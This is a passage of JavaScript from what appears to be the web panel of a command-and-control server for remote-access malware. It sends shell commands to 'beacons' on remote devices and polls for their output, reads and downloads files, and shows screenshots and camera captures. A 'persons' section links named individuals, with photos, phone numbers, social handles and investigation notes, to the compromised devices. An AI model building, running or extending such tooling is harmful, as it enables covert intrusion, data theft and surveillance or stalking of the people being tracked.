        img.src = 'api.php?action=device_read&beacon_uuid=' + encodeURIComponent(uuid) + '&path=' + encodeURIComponent(path);
        document.getElementById('mim').classList.add('on');
    }
}

async function dfDownload(uuid, path, name) {
    const a = document.createElement('a');
    a.href = 'api.php?action=device_read&beacon_uuid=' + encodeURIComponent(uuid) + '&path=' + encodeURIComponent(path);
    a.download = name;
    a.click();
    tm('Downloading ' + name, 0);
}

async function dc() {
    const inp = document.getElementById('tin');
    const cmd = inp.value.trim();
    if (!cmd || !SEL) { tm('Select a device', 1); return; }
    if (cmd === 'clear' || cmd === 'cls') { clearTerminal(); return; }
    inp.value = '';
    _hist.push(cmd); if (_hist.length > 100) _hist.shift();
    _histIdx = _hist.length;
    tA(SEL, 'g', '$ ' + cmd);
    tA(SEL, 's', 'Sent, waiting for beacon...');
    const r = await ApiClient.post('task', { beacon_uuid: SEL, command: cmd });
    if (r && r.status === 'created') { TID = r.id; poll(SEL, r.id, 40); }
    else { if (TRMS[SEL] && TRMS[SEL].length && TRMS[SEL][TRMS[SEL].length - 1].t === 's') TRMS[SEL].pop(); tA(SEL, 'r', 'Failed to send command'); }
}

function tk(e) {
    if (e.key === 'Enter') { dc(); return; }
    if (e.key === 'ArrowUp') {
        if (_histIdx > 0) { _histIdx--; document.getElementById('tin').value = _hist[_histIdx]; }
        e.preventDefault();
    } else if (e.key === 'ArrowDown') {
        if (_histIdx < _hist.length - 1) { _histIdx++; document.getElementById('tin').value = _hist[_histIdx]; }
        else { _histIdx = _hist.length; document.getElementById('tin').value = ''; }
        e.preventDefault();
    }
}

function clearTerminal() {
    if (!SEL) return;
    TRMS[SEL] = [{ t: 's', v: 'Terminal cleared.' }];
    rT(SEL);
}

function qc(c) { if (!SEL) { tm('Select device', 1); return; } document.getElementById('tin').value = c; dc(); }

async function cancelTask() {
    if (!SEL) { tm('Select a device', 1); return; }
    const tasks = await ApiClient.get('tasks', { beacon_uuid: SEL, status: 'pending' });
    if (!tasks || !tasks.length) { tm('No pending tasks', 1); return; }
    const last = tasks[0];
    const r = await ApiClient.post('task_cancel', { id: last.id });
    if (r && r.status === 'cancelled') {
        if (TRMS[SEL] && TRMS[SEL].length && TRMS[SEL][TRMS[SEL].length - 1].t === 's') TRMS[SEL].pop();
        tA(SEL, 'r', '[CANCELLED] Task #' + last.id + ' (' + last.command.substring(0, 40) + '...)');
        tm('Task cancelled');
    } else { tm('Failed to cancel', 1); }
}

function poll(u, tid, n) {
    let c = 0;
    const iv = setInterval(async () => {
        c++;
        const res = await ApiClient.get('results', { task_id: tid });
        if (res && res.length) {
            clearInterval(iv);
            if (TRMS[u] && TRMS[u].length && TRMS[u][TRMS[u].length - 1].t === 's') TRMS[u].pop();
            const out = res[0].output || '(empty)';
            tA(u, 'w', out);
            const b = _beaconCache;
            if (b) buildList(b);
            if (u === SEL) { await loadInfo(SEL); await loadBF(SEL); await loadBM(SEL); fmRefresh(); }
            if (out.startsWith('[MEDIA]')) { for (const ln of out.split('\n')) { const m = ln.replace('[MEDIA]', '').trim(); if (m) showM(m); } }
            try {
                const j = JSON.parse(out);
                if (j.files) {
                    await ApiClient.post('browse_cache', { beacon_uuid: u, path: j.path || '/tmp', entries: j.files });
                    if (u === SEL && FM_PATH === (j.path || '/tmp')) fmRender(j.files, j.path || '/tmp');
                }
            } catch (e) { }
        } else if (c >= n || c * 5 > 120) {
            clearInterval(iv);
            if (TRMS[u] && TRMS[u].length && TRMS[u][TRMS[u].length - 1].t === 's') TRMS[u].pop();
            if (u === SEL) tA(u, 'r', 'Timed out (beacon offline?)');
        }
    }, 5000);
}

async function loadBF(uuid) {
    const el = document.getElementById('bfs');
    const f = await ApiClient.get('files', { beacon_uuid: uuid });
    if (!f || !f.length) { el.innerHTML = '<div style="color:var(--text2);font-size:11px">No files.</div>'; return; }
    el.innerHTML = '<table><thead><tr><th>File</th><th>Size</th><th>Date</th><th></th></tr></thead><tbody>' +
        f.map(x => '<tr><td style="font-family:monospace;font-size:10px">' + es(x.filename) + '</td><td>' + (x.size > 1024 ? (x.size / 1024).toFixed(1) + 'K' : x.size + 'B') + '</td><td style="font-size:9px">' + es((x.created_at || '').substring(5, 16)) + '</td><td><a href="api.php?action=file&id=' + x.id + '" download class="btn btn-xs btn-b" style="text-decoration:none">dl</a> <button class="btn btn-xs btn-r" onclick="event.stopPropagation();delFile(' + x.id + ',\'file\')" title="Delete">x</button></td></tr>').join('') +
        '</tbody></table>';
}

async function delFile(id, type) {
    if (!confirm('Delete this ' + type + '?')) return;
    const r = await ApiClient.post('delete_upload', { id: id, type: type });
    if (r && r.status === 'deleted') { tm('Deleted', 0); if (SEL) { loadBF(SEL); loadBM(SEL); } }
    else tm('Delete failed', 1);
}

async function loadBM(uuid) {
    const el = document.getElementById('bme');
    const m = await ApiClient.get('media', { beacon_uuid: uuid });
    document.getElementById('mcn').textContent = m && m.length ? '(' + m.length + ')' : '';
    if (!m || !m.length) { el.innerHTML = '<div style="color:var(--text2);font-size:11px">Send screenshot or cam command.</div>'; return; }
    el.innerHTML = '<div class="mg">' + m.map(x => '<div class="mi" onclick="showM(' + x.id + ')"><img src="api.php?action=media&id=' + x.id + '" loading="lazy" onerror="this.remove()"><div class="mi2">' + es(x.type) + ' <button class="btn btn-xs btn-r" onclick="event.stopPropagation();delFile(' + x.id + ',\'media\')" style="font-size:8px;padding:1px 4px">x</button></div></div>').join('') + '</div>';
}

function showM(id) {
    document.getElementById('mim-s').src = 'api.php?action=media&id=' + id;
    document.getElementById('mim').classList.add('on');
}

function renderPersons(ps) {
    const el = document.getElementById('plist');
    if (!ps || !ps.length) { el.innerHTML = '<div style="padding:20px;text-align:center;color:var(--text2);font-size:10px">No persons. Add one.</div>'; return; }
    el.innerHTML = '<div class="pr-cards">' + ps.map(p => {
        const dc = Array.isArray(p.linked_devices) ? p.linked_devices.length : 0;
        const av = p.photo ? '<img src="api.php?action=person_photo_get&id=' + p.id + '" class="pr-av-sm" onerror="this.outerHTML=\'<div class=\\\'pr-av-sm\\\' style=\\\'display:flex;align-items:center;justify-content:center;font-size:18px;background:var(--surface)\\\'>\\&#128100;</div>\'">' : '<div class="pr-av-sm" style="display:flex;align-items:center;justify-content:center;font-size:18px;background:var(--surface)">&#128100;</div>';
        const created = ((p.created_at || '').substring(5, 16) || '');
        const updated = ((p.updated_at || '').substring(5, 16) || '');
        const timeStr = created ? (updated !== created ? created + ' cr' : created) : '';
        const social = Array.isArray(p.social) ? p.social : (typeof p.social === 'object' && p.social ? p.social : {});
        const handle = Object.keys(social).length ? (social.twitter || social.instagram || social.telegram || '') : '';
        return '<div class="pr-card" onclick="openPerson(\'' + p.id + '\')">' + av + '<div class="pr-ci"><div class="pr-cn">' + es(p.name) + '</div><div class="pr-cs">' + (dc > 0 ? dc + ' device(s)' : '') + (handle ? ' <span style="opacity:.7">' + es(handle) + '</span>' : '') + (timeStr ? ' <span style="opacity:.5">| ' + timeStr + '</span>' : '') + '</div></div></div>';
    }).join('') + '</div>';
}
async function loadPersons() {
    if (_personCache && _personCache.length) { renderPersons(_personCache); document.getElementById('pcnt').textContent = '(' + _personCache.length + ')'; }
    const ps = await ApiClient.get('persons');
    if (!ps) return;
    _personCache = ps;
    document.getElementById('pcnt').textContent = '(' + ps.length + ')';
    renderPersons(ps);
}

async function openPerson(id) {
    try {
        const p = await ApiClient.get('person', { id });
        if (!p || !p.id) { tm('Person not found', 1); document.getElementById('pm').classList.remove('on'); return; }
        const devices = Array.isArray(p.linked_devices) ? p.linked_devices : [];
        const social = Array.isArray(p.social) ? p.social : (typeof p.social === 'object' && p.social ? p.social : {});
        const dc = devices.length;
        const beacons = Array.isArray(_beaconCache) ? _beaconCache : [];
        const devHtml = devices.length ? devices.map(d => {
            const b = beacons.find(x => x.uuid === d);
            const nm = b ? es(b.nickname || b.hostname || b.uuid.substring(0, 8)) : d.substring(0, 8);
            return '<span class="pr-dt" onclick="selB(\'' + d + '\')">' + nm + '<span class="pr-dx" onclick="event.stopPropagation();linkDevice(\'' + p.id + '\',\'' + d + '\',true)">&times;</span></span>';
        }).join('') : '<span style="font-size:10px;color:var(--text2)">No devices linked</span>';
        const av = p.photo ? '<img src="api.php?action=person_photo_get&id=' + p.id + '" class="pr-av" onerror="this.outerHTML=\'<div class=\\\'pr-av\\\' style=\\\'display:flex;align-items:center;justify-content:center;font-size:28px;border-radius:50%\\\'>&#128100;</div>\'">' : '<div class="pr-av" style="display:flex;align-items:center;justify-content:center;font-size:28px">&#128100;</div>';
        const beaconsSel = beacons.filter(x => !devices.includes(x.uuid)).map(x => '<option value="' + x.uuid + '">' + es(x.nickname || x.hostname || x.uuid.substring(0, 8)) + '</option>').join('');
        document.getElementById('pm-c').innerHTML = `<div style="padding:14px">
            <div style="display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:10px">
                <div>
                    <b style="font-size:15px">&#128100; ${es(p.name)}</b>
                    <div style="font-size:9px;color:var(--text2);margin-top:2px;font-family:monospace">ID: ${es(p.id)}</div>
                </div>
                <span>
                    <button class="btn btn-xs btn-gh" onclick="personForm('${p.id}')">Edit</button>
                    <button class="btn btn-xs btn-r" onclick="if(confirm('Delete person?'))deletePerson('${p.id}')">Delete</button>
                    <button class="btn btn-xs btn-gh" onclick="document.getElementById('pm').classList.remove('on')">Close</button>
                </span>
            </div>
            <div style="font-size:9px;color:var(--text2);margin-bottom:8px">&#128337; Created: ${p.created_at || '-'} | Updated: ${p.updated_at || '-'}</div>
            <div class="pr-rw">
                ${av}
                <div class="pr-info">
                    <div class="ps">ID: ${es(p.id)}</div>
                    ${p.info ? '<div class="pd">' + es(p.info) + '</div>' : ''}
                    <div style="margin-top:6px"><b style="font-size:10px;color:var(--text2)">&#128221; Notes</b>
                    <div class="pd" style="font-size:11px">${p.notes ? es(p.notes) : '<span style="color:var(--text2)">No notes.</span>'}</div></div>
                </div>
            </div>
            ${Object.keys(social).length ? '<div style="margin-top:8px"><b style="font-size:10px;color:var(--text2)">&#128279; Social / Contact</b><div style="display:grid;grid-template-columns:1fr 1fr;gap:3px;margin-top:4px;font-size:11px">' + Object.entries(social).filter(([,v])=>v).map(([k,v])=>{const icons={twitter:'&#120143;',instagram:'&#128247;',phone:'&#128222;',email:'&#9993;',telegram:'&#128172;',whatsapp:'&#128225;',signal:'&#128100;',facebook:'&#128262;'};const links={twitter:'https://twitter.com/',instagram:'https://instagram.com/',facebook:'https://facebook.com/',telegram:'https://t.me/',email:'mailto:',whatsapp:'https://wa.me/',phone:'tel:',signal:'https://signal.me/'};const icon=icons[k]||'&#128279;';const link=links[k]||'';const display=link&&k!=='email'&&k!=='phone'&&k!=='whatsapp'&&k!=='signal'?v.replace(/^@/,''):v;const href=link+(k==='email'||k==='phone'||k==='whatsapp'||k==='signal'?v.replace(/[^0-9+]/g,''):display);return '<span>'+icon+' <a href="'+href+'" target="_blank" style="color:var(--cyan)">'+es(v)+'</a></span>';}).join('')+'</div></div>' : ''}
            <div style="margin-top:8px"><b style="font-size:10px;color:var(--text2)">&#128268; Linked Devices</b>
            <div class="pr-dev">${devHtml}</div></div>
            <div style="margin-top:6px;display:flex;gap:4px"><select id="pl-ds" style="flex:1"><option value="">${beaconsSel ? 'Link a device...' : 'No devices available'}</option>${beaconsSel}</select>${beaconsSel ? '<button class="btn btn-xs btn-g" onclick="linkDeviceFromPerson(\'' + p.id + '\')">Link</button>' : ''}</div>
            <div style="margin-top:8px"><b style="font-size:10px;color:var(--text2)">&#128247; Photo</b>
            <div style="margin-top:4px;display:flex;gap:4px"><input type="file" id="pf-upload" accept="image/*" style="flex:1;font-size:10px"><button class="btn btn-xs btn-b" onclick="uploadPersonPhoto('${p.id}')">Upload</button></div></div>
            <div style="margin-top:8px"><b style="font-size:10px;color:var(--text2)">&#128193; Files <span id="hf-cnt-${es(p.id)}"></span></b>
            <div id="hf-body-${es(p.id)}" style="font-size:10px;color:var(--text2);margin-top:4px">Loading...</div></div>
        </div>`;
        document.getElementById('pm').classList.add('on');
        (async () => {
            const hf = await ApiClient.get('human_files', { id: p.id });
            const hfe = document.getElementById('hf-body-' + p.id);
            const hfc = document.getElementById('hf-cnt-' + p.id);
            if (!hf || !hf.entries || !hf.entries.length) { hfe.innerHTML = '<span style="color:var(--text2)">No files.</span>'; hfc.textContent = ''; return; }
            hfc.textContent = '(' + hf.entries.length + ')';
            hfe.innerHTML = '<div style="display:flex;flex-direction:column;gap:2px">' + hf.entries.map(e => {
                const icon = e.type === 'dir' ? '&#128193;' : '&#128196;';
                const sz = e.size > 1024 ? (e.size / 1024).toFixed(1) + 'K' : e.size + 'B';
                if (e.type === 'dir') return '<span style="color:var(--cyan)">' + icon + ' ' + es(e.name) + '</span>';
                return '<span style="display:flex;justify-content:space-between"><span>' + icon + ' <a href="api.php?action=human_file_read&id=' + p.id + '&file=' + es(e.name) + '" target="_blank" style="color:var(--text)">' + es(e.name) + '</a></span><span style="color:var(--text2)">' + sz + '</span></span>';
            }).join('') + '</div>';
        })();
    } catch (e) {
        tm('Error: ' + (e.message || e), 1);
    }
}

function personForm(id) {
    (async () => {
        const beacons = _beaconCache;
        const devOpts = beacons && beacons.length ? beacons.map(x => '<option value="' + x.uuid + '">' + es(x.nickname || x.hostname || x.uuid.substring(0, 8)) + '</option>').join('') : '';
        const p = id ? await ApiClient.get('person', { id }) : null;
        const linked = p && p.linked_devices ? p.linked_devices : [];
        const soc = p && p.social ? p.social : {};
        document.getElementById('pm-c').innerHTML = `<div style="padding:14px">
                <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
                    <b style="font-size:13px">${id ? 'Edit Person' : 'New Person'}</b>
                    <button class="btn btn-xs btn-gh" onclick="document.getElementById('pm').classList.remove('on')">Close</button>
                </div>
                <div class="pr-form">
                    <label>Name *</label>
                    <input id="pf-name" placeholder="Full name" value="${p ? es(p.name) : ''}">
                    <label>Info (description, alias, etc.)</label>
                    <textarea id="pf-info" placeholder="e.g. Known associate, last seen at...">${p ? es(p.info) : ''}</textarea>
                    <label style="margin-top:8px;font-weight:700;color:var(--text)">&#128279; Social / Contact</label>
                    <div style="display:grid;grid-template-columns:1fr 1fr;gap:4px">
                        <div><label>&#64; Twitter/X</label><input id="pf-twitter" placeholder="@username" value="${es(soc.twitter || '')}"></div>
                        <div><label>&#128247; Instagram</label><input id="pf-instagram" placeholder="@username" value="${es(soc.instagram || '')}"></div>
                        <div><label>&#128222; Phone</label><input id="pf-phone" placeholder="+1 234 567 890" value="${es(soc.phone || '')}"></div>
                        <div><label>&#9993; Email</label><input id="pf-email" placeholder="email@example.com" value="${es(soc.email || '')}"></div>
                        <div><label>&#128172; Telegram</label><input id="pf-telegram" placeholder="@username" value="${es(soc.telegram || '')}"></div>
                        <div><label>&#128225; WhatsApp</label><input id="pf-whatsapp" placeholder="+1 234 567 890" value="${es(soc.whatsapp || '')}"></div>
                        <div><label>&#128100; Signal</label><input id="pf-signal" placeholder="+1 234 567 890" value="${es(soc.signal || '')}"></div>
                        <div><label>&#128262; Facebook</label><input id="pf-facebook" placeholder="username" value="${es(soc.facebook || '')}"></div>
                    </div>
                    <label style="margin-top:8px">&#128221; Notes</label>
                    <textarea id="pf-notes" placeholder="Investigation notes..." style="min-height:80px">${p ? es(p.notes) : ''}</textarea>
                    <label>&#128268; Link Device</label>
                    <select id="pf-dev"><option value="">${devOpts ? 'Select a device to link...' : 'No devices available'}</option>${devOpts}</select>
                    ${id && linked.length ? '<div style="font-size:10px;color:var(--cyan);margin-top:2px">Linked: ' + linked.map(d => { const b = beacons ? beacons.find(x => x.uuid === d) : null; return b ? es(b.nickname || b.hostname || d.substring(0, 8)) : d.substring(0, 8); }).join(', ') + '</div>' : ''}
                    <div style="margin-top:8px;display:flex;gap:4px;justify-content:flex-end">
                        <button class="btn btn-xs btn-gh" onclick="document.getElementById('pm').classList.remove('on')">Cancel</button>
                        <button class="btn btn-xs btn-g" onclick="savePerson('${id || ''}')">Save</button>
                    </div>
                </div>
            </div>`;
        document.getElementById('pm').classList.add('on');
    })();
}

async function savePerson(id) {
    const name = document.getElementById('pf-name').value.trim();
    if (!name) { tm('Name required', 1); return; }
    const info = document.getElementById('pf-info').value;
    const notes = document.getElementById('pf-notes').value;
    const social = {
        twitter: document.getElementById('pf-twitter')?.value || '',
        instagram: document.getElementById('pf-instagram')?.value || '',
        phone: document.getElementById('pf-phone')?.value || '',
        email: document.getElementById('pf-email')?.value || '',
        telegram: document.getElementById('pf-telegram')?.value || '',
        whatsapp: document.getElementById('pf-whatsapp')?.value || '',
        signal: document.getElementById('pf-signal')?.value || '',
        facebook: document.getElementById('pf-facebook')?.value || ''
    };
    Object.keys(social).forEach(k => { if (!social[k]) delete social[k]; });
    if (id) {
        const r = await ApiClient.post('person', { id, name, info, notes, social });
        if (r && r.status === 'ok') {
            const dev = document.getElementById('pf-dev');
            if (dev && dev.value) { await linkDevice(id, dev.value, false, true); }
            tm('Person updated');
            document.getElementById('pm').classList.remove('on');
            loadPersons();
            if (SEL) loadInfo(SEL);
        } else tm('Failed to update', 1);
    } else {
        const r = await ApiClient.post('persons', { name, info, notes, social });
        if (r && r.id) {
            const dev = document.getElementById('pf-dev');
            if (dev && dev.value) { await linkDevice(r.id, dev.value, false, true); }
            tm('Person created');
            document.getElementById('pm').classList.remove('on');
            loadPersons();
            if (SEL) loadInfo(SEL);
        } else tm('Failed to create', 1);
    }
}

async function deletePerson(id) {
    if (!id) { tm('Invalid person ID', 1); return; }
    const r = await ApiClient.post('person_delete', { id });
    if (r && r.status === 'ok') { tm('Person deleted'); document.getElementById('pm').classList.remove('on'); loadPersons(); if (SEL) loadInfo(SEL); }
    else tm('Failed to delete' + (r && r.error ? ': ' + r.error : ''), 1);
}

async function linkDevice(personId, beaconUuid, unlink, quiet) {
    const r = await ApiClient.post('person_link', { person_id: personId, beacon_uuid: beaconUuid, unlink: !!unlink });
    if (r && r.status === 'ok') { loadPersons(); if (!quiet) { openPerson(personId); if (!unlink) tm('Device linked'); } if (SEL) loadInfo(SEL); }
    else if (!quiet) tm('Failed to link', 1);
}

async function linkDeviceFromPerson(personId) {
    const sel = document.getElementById('pl-ds');
    if (!sel.value) { tm('Select a device', 1); return; }
    await linkDevice(personId, sel.value, false);
}

async function uploadPersonPhoto(id) {
    const fileInput = document.getElementById('pf-upload');
    if (!fileInput.files || !fileInput.files[0]) { tm('Select an image', 1); return; }
    const reader = new FileReader();
    reader.onload = async function (e) {
        const b64 = e.target.result.split(',')[1];
        const r = await ApiClient.post('person_photo', { id, data: b64 });
        if (r && r.status === 'ok') { tm('Photo uploaded'); openPerson(id); loadPersons(); }
        else tm('Failed to upload photo', 1);
    };
    reader.readAsDataURL(fileInput.files[0]);
}

function getPersonForDevice(uuid, persons) {
    if (!persons || !uuid) return null;
    return persons.find(p => p.linked_devices && p.linked_devices.includes(uuid)) || null;
}

async function linkDevicePerson(sel, uuid) {
    const pid = sel.value;
    if (!pid) return;
    const r = await ApiClient.post('person_link', { person_id: pid, beacon_uuid: uuid });
    if (r && r.status === 'ok') { tm('Device linked'); await loadInfo(uuid); loadPersons(); }
    else tm('Failed to link', 1);
}

async function unlinkDevicePerson(pid, uuid) {
    const r = await ApiClient.post('person_link', { person_id: pid, beacon_uuid: uuid, unlink: true });
    if (r && r.status === 'ok') { tm('Device unlinked'); await loadInfo(uuid); loadPersons(); }
    else tm('Failed to unlink', 1);
}

function logout() {
    ApiClient.fetch('api.php?action=logout', { method: 'POST' }).then(() => {
        localStorage.removeItem('csrf_token');
        window.location.reload();
    });
}

async function ref() {
    if (_refRunning) return;
    _refRunning = true;
    try {
        const b = await ApiClient.get('beacons');
        if (!b) return;
        _beaconCache = b;
        const t = await ApiClient.get('tasks');
        _taskCache = t;
        const m = await ApiClient.get('media');
        _mediaCache = m;
        const f = await ApiClient.get('files');
        _fileCache = f;
        const tot = b.length, act = b.filter(x => x.status === 'active').length;
        const pend = t ? t.filter(x => x.status === 'pending' || x.status === 'assigned').length : 0;
        const done = t ? t.filter(x => x.status === 'completed').length : 0;
        document.getElementById('s-act').textContent = act;
        document.getElementById('s-dead').textContent = tot - act;
        document.getElementById('s-tot').textContent = tot;
        document.getElementById('s-pend').textContent = pend;
        document.getElementById('s-done').textContent = done;
        if (SEL) {
            const be = b.find(x => x.uuid === SEL);
            if (be && be.status !== 'active') {
                const dot = document.querySelector('.bit[data-u="' + CSS.escape(SEL) + '"] .dd');
                if (dot) dot.style.background = 'var(--red)';
            }
        }
        buildList(b);
    } finally {
        _refRunning = false;
    }
}



// Start: load initial data, then poll gently
ref();

let _refPause = false;
_refTimer = setInterval(() => {
    if (document.hidden || _refPause) return;
    ref();
}, 10000);

// Pause background refresh while any modal is open
document.addEventListener('visibilitychange', () => {
    if (document.hidden) _refPause = true;
    else _refPause = false;
});

// Prevent ref() from interrupting user input
document.getElementById('bf')?.addEventListener('focus', () => { _refPause = true; });
document.getElementById('bf')?.addEventListener('blur', () => { _refPause = false; });
document.getElementById('tin')?.addEventListener('focus', () => { _refPause = true; });
document.getElementById('tin')?.addEventListener('blur', () => { _refPause = false; });